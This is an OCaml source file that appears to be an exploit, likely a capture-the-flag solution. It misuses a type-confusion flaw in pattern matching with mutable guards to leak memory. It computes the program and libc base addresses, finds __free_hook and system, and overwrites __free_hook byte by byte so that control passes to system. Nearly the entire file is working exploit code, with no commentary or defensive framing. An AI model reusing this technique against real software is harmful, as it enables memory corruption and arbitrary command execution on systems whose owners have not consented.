open Printf
open Bytes

type t = A of int | B of (bytes)
type s = C of int | D of (string )
type t2 = E of int | F of (int ref)
type s2 = G of int | H of (int -> string)

let s = "hogefugakasukasukasu"

let bye (x1, x2) y =
   match (x1, x2) with
    (false, _) -> "a"
  | (_, {contents=G _}) -> "b"
  | _ when (x2 := G y; false) -> "c"
  | (true, {contents=H y}) -> y 14700022565482775
let rec byebye n x y =
    if n = 0 then bye x y ^ "c" else byebye (n-1) x y ^ "d"

let leak3 (x1,x2) y =
  match (x1,x2) with
    (false, _) -> of_string "a"
  | (_,{contents=A _}) -> of_string "b"
  | _ when (x2 := A y; false) -> of_string "c"
  | (true, {contents=B y}) -> y

let leak (x1,x2) s =
  match (x1,x2) with
    (false,_) -> 0
  | (_,{contents=D _}) -> 1
  | _ when (x2 := D(s); false) -> 2
  | (true, {contents=C y}) -> y

let leak2 (x1,x2) y =
  match (x1,x2) with
    (false, _) -> ref 0
  | (_,{contents=E _}) -> ref 1
  | _ when (x2 := E(y); false) -> ref 2
  | (true, {contents=F y}) -> y

let prog_base = leak (true, ref (C 1)) s * 2 - 0x2852d0 + 1
let target = (0x283cb8 + prog_base) / 2
let r = leak2 (true, ref (F (ref 1))) target
let libc_base = ((!r) land 0xffffffffff) * 2 * 256 - 0x42600
let free_hook = libc_base + 0x3ed8e0
let system = libc_base + 0x4f3c2

let _ = printf "0x%x\n" (prog_base)
let _ = printf "0x%x\n" libc_base
let _ = printf "0x%x\n" free_hook
let _ = printf "0x%x\n" system

let r = leak3 (true,ref (B (of_string "c"))) (free_hook / 2)
let () = set r 0 (char_of_int ((system lsr 0) mod 256))
let () = set r 1(char_of_int ((system lsr 8) mod 256))
let () = set r 2(char_of_int ((system lsr 16) mod 256))
let () = set r 3(char_of_int ((system lsr 24) mod 256))
let () = set r 4(char_of_int ((system lsr 32) mod 256))
let () = set r 5(char_of_int ((system lsr 40) mod 256))
let () = set r 6(char_of_int ((system lsr 48) mod 256))

let s = byebye 1 (true, ref(H(string_of_int))) (free_hook/ 2)

